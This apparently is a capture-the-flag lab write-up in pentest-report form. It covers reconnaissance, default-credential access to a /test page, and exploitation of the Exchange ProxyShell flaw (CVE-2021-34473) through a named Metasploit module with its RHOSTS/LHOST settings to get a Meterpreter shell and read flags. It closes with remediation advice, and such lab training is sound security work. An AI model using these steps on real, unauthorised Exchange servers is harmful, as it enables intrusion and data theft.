Project Objective
The goal of this project was to conduct a penetration test on the system with IP address 10.10.102.166 to identify vulnerabilities, gain unauthorized access, and extract sensitive data (flags). Key tasks included:

Reconnaissance of services and open ports.

Authentication bypass and vulnerability exploitation.

Gaining access to internal resources.

Documenting findings and providing remediation recommendations.

Work Performed
1. Reconnaissance
I performed network scanning using Nmap:

Discovered critical open ports: 80 (HTTP), 443 (HTTPS), 3389 (RDP).

Identified service versions:

Microsoft IIS 10.0 (web server).

Microsoft Exchange (confirmed via SSL certificate analysis and /owa path).

Windows Server 2019 (based on RDP version).

2. Web Interface Analysis
Used Gobuster to search for hidden directories:

Found /rpc (requires authentication), indicating Microsoft Exchange.

Discovered /test, protected by basic authentication.

Manual Vulnerability Testing:

Brute-forced credentials (admin:admin) granted access to /test, where I found:

Flags:

THM{Security_Through_Obscurity_Is_Not_A_Defense}

THM{Stop_Reading_Start_Doing}

An admin note mentioning missing Exchange updates, hinting at ProxyShell vulnerability.

3. ProxyShell Exploitation
Used Metasploit Framework for the attack:

Module: exploit/windows/http/exchange_proxyshell_rce.

Configuration:

bash
set RHOSTS 10.10.102.166
set LHOST 10.10.95.52
exploit
Result:

Successfully obtained a Meterpreter session.

Automatic web shell creation and remote code execution (RCE).

4. Post-Exploitation

Switched to Windows command shell:

bash
shell
Located and extracted the final flag:

Navigated to C:\Users\Administrator\Documents.

Read flag.txt:

bash
more flag.txt
Final flag: THM{Looking_Back_Is_Not_Always_Bad}.

Findings & Recommendations
Identified Vulnerabilities:

Unsecured test interface (/test) with weak credentials (admin:admin).

ProxyShell vulnerability (CVE-2021-34473) due to unpatched Exchange.

Remediation Steps:

Remove or restrict access to test interfaces (e.g., /test).

Install all security updates for Microsoft Exchange.

Disable basic authentication on critical resources; use OAuth or 2FA instead.

Conduct regular security audits to detect similar vulnerabilities.

Conclusion:
The penetration test was successfully completed, covering all stages from reconnaissance to full system access. All objectives were achieved, and flags were retrieved. The vulnerabilities stemmed from poor server configuration and lack of updates, which are common in insecure setups.
